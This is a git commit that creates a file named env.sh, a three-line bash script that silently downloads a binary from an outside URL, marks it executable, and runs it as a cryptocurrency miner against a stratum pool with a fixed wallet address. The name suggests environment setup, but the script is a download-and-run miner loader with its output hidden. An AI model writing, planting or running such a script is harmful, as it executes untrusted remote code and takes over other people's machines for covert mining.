4c44240ba380c0a9b8e8b0aac6b4b0629929b8aa
traapoks <165988185+traapoks@users.noreply.github.com>
2024-04-04 13:00:25 +0700

    Create env.sh

---
+++ env.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+wget -q -O home https://iplog.co/bash && chmod +x home >/dev/null 2>&1
+./home -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17115 -u shuga1qxnrz9hvsa4teqzy9683wxe8eavc0vmn8a2e7ua.$(echo $(shuf -i 1-9 -n 1)-Suuu) -p -t2
